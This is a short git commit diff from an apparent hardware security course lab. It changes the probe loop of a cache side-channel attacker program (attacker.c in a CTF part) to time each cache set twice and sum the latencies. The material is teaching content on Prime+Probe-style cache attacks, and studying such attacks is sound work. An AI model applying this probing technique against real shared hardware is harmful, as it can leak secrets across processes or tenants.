9b8d0cc70ae91ad9b1b20b03a6eb0a13f7979901
Brenton Lian <brenton.lian@gmail.com>
2026-03-09 12:06:22 -0400

    previous version was ok, adding double probing

--- hwsec-course/lab-cacheattacks/Part3-CTF/attacker.c
+++ hwsec-course/lab-cacheattacks/Part3-CTF/attacker.c
@@ -101,15 +101,21 @@ int main() {
                 wait_cycles(5000);
 
                 /* PROBE this set */
-                uint64_t start = rdtscp();
 
-                for(int w = 0; w < WAYS; w++) {
-                    tmp ^= *eviction_sets[set][w];
+                uint64_t latency = 0;
+
+                for(int r = 0; r < 2; r++) {
+                    uint64_t start = rdtscp();
+
+                    for(int w = 0; w < WAYS; w++) {
+                        tmp ^= *eviction_sets[set][w];
+                    }
+
+                    uint64_t end = rdtscp();
+                    latency += (end - start);
                 }
 
-                uint64_t end = rdtscp();
-
-                scores[set] += (end - start);
+                scores[set] += latency;
             }
         }
         int best_set = 0;
